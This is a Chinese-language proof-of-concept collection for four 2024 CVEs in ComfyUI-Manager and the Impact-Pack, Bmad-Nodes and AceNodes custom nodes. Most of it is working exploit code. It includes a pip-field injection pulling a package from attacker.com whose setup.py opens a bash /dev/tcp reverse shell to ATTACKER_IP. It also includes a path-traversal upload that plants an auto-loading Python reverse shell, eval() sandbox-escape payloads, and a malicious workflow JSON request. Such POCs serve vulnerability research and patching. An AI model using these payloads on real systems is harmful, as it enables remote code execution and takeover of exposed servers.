# ComfyUI Manager 漏洞 POC

## 系统简介

ComfyUI 是一款基于节点的 Stable Diffusion 图形界面工具。ComfyUI-Manager 是其官方插件管理器，用于安装和管理自定义节点扩展。

---

## CVE-2024-21574 — 自定义节点 pip 依赖注入 RCE

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-21574 |
| 漏洞类型 | 远程代码执行（pip 依赖注入） |
| 认证要求 | 无需认证（本地网络可达） |
| 影响组件 | ComfyUI-Manager |

### 漏洞原理

ComfyUI-Manager 的 `/customnode/install` 端点安装自定义节点时，验证 `files` 字段是否在 `custom-node-list.json` 白名单中，但**完全不验证 `pip` 字段**。

攻击者可使用合法的 `files`（白名单节点），同时在 `pip` 字段中注入指向攻击者控制的恶意 Python 包的 URL。pip 安装时执行恶意包的 `setup.py`，实现 RCE。

### POC

```bash
curl -i http://localhost:8188/api/customnode/install \
  -X POST -H 'Content-Type: application/json' \
  -d '{
    "author": "bvhari",
    "files": ["https://github.com/bvhari/ComfyUI_SUNoise"],
    "pip": ["http://attacker.com/malicious_package"],
    "title": "ComfyUI_SUNoise"
  }'
```

**恶意 Python 包的 setup.py 示例：**

```python
from setuptools import setup
import os

os.system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")

setup(name="malicious", version="1.0")
```

---

## CVE-2024-21575 — ComfyUI-Impact-Pack 路径遍历 → 任意文件写入 RCE

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-21575 |
| 漏洞类型 | 路径遍历 → 任意文件写入 → RCE |
| 影响组件 | ComfyUI-Impact-Pack |

### 漏洞原理

`/upload/temp` 端点直接从用户请求的 `image.filename` 属性派生文件名，没有任何路径验证或净化，允许使用 `../` 序列逃逸临时目录。

### POC

```bash
# 上传 Python payload 到 custom_nodes 目录（服务重启后自动加载）
curl -X POST http://localhost:8188/api/upload/temp \
  -F "image=@payload.py;filename=../custom_nodes/pwn.py"
```

**payload.py（自动执行的反弹 shell）：**

```python
import os
import socket
import subprocess

def reverse_shell():
    s = socket.socket()
    s.connect(("ATTACKER_IP", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash"])

reverse_shell()
```

---

## CVE-2024-21576 — ComfyUI-Bmad-Nodes eval() 代码注入

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-21576 |
| 漏洞类型 | eval() 注入 → RCE |
| 影响组件 | ComfyUI-Bmad-Nodes |

### 漏洞原理

`BuildColorRangeHSVAdvanced` 节点对用户输入调用 `eval()`。字符串替换净化方式可通过访问 `math` 模块上下文变量中的 `__builtins__` 绕过。

### Exploit Payload

```python
# 在节点的 STRING 输入字段中注入：
[h_v('os').system('whoami') for h_k, h_v in m.__spec__.__init__.__builtins__.items() if '__imp' in h_k]
```

---

## CVE-2024-21577 — ComfyUI-AceNodes 无限制 eval RCE

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-21577 |
| 漏洞类型 | eval() 注入 → RCE |
| 影响组件 | ComfyUI-AceNodes |

### 漏洞原理

`ACE_ExpressionEval` 节点在没有任何输入净化的情况下使用 Python 的 `eval()` 函数。

### Exploit

```python
# 在节点的 STRING 输入字段中直接输入：
__import__('os').system('id')

# 反弹 shell：
__import__('os').system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')
```

---

## 通用利用方式（通过工作流 JSON）

ComfyUI 接受 JSON 格式的工作流文件，可以通过上传恶意工作流 JSON 来触发包含漏洞节点的执行：

```bash
# 通过 API 提交恶意工作流
curl -X POST http://localhost:8188/prompt \
  -H 'Content-Type: application/json' \
  -d '{"prompt": {"1": {"class_type": "ACE_ExpressionEval", "inputs": {"expression": "__import__(\"os\").system(\"id\")"}}}}'
```

### 参考资料

- [Snyk Labs 技术分析](https://labs.snyk.io/resources/hacking-comfyui-through-custom-nodes/)
- [NVD CVE-2024-21574](https://nvd.nist.gov/vuln/detail/CVE-2024-21574)
- [NVD CVE-2024-21577](https://nvd.nist.gov/vuln/detail/CVE-2024-21577)
- [SentinelOne CVE-2024-21574](https://www.sentinelone.com/vulnerability-database/cve-2024-21574/)
- [GitHub ComfyUI-Manager Issue #594](https://github.com/Comfy-Org/ComfyUI-Manager/issues/594)
- [Censys Botnet 报告](https://censys.com/blog/comfyui-servers-cryptomining-proxy-botnet/)
